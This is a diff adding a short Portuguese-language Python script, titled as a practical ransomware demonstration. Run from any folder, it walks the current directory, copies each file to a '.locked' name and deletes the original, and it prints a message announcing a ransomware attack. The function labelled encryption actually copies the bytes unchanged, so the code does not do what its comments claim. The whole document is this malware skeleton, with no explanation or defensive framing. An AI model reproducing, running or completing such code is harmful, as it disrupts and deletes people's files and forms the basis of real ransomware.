@@ -1,0 +1,27 @@
+Entendendo um Ransomware na Prática com Python
+import os
+import random
+import time
+
+# Função de criptografia (apenas como exemplo)
+def criptografar_arquivo(caminho_arquivo):
+    try:
+        with open(caminho_arquivo, 'rb') as f:
+            dados = f.read()
+        with open(caminho_arquivo + ".locked", 'wb') as f:
+            f.write(dados)
+        os.remove(caminho_arquivo)
+    except Exception as e:
+        print(f"Erro ao criptografar {caminho_arquivo}: {e}")
+
+# Função para buscar arquivos na máquina
+def buscar_arquivos(diretorio):
+    for root, dirs, files in os.walk(diretorio):
+        for file in files:
+            criptografar_arquivo(os.path.join(root, file))
+
+# Início da criptografia
+if __name__ == '__main__':
+    print("Iniciando ataque ransomware...")
+    time.sleep(2)
+    buscar_arquivos(os.getcwd())  # Atacar arquivos no diretório atual
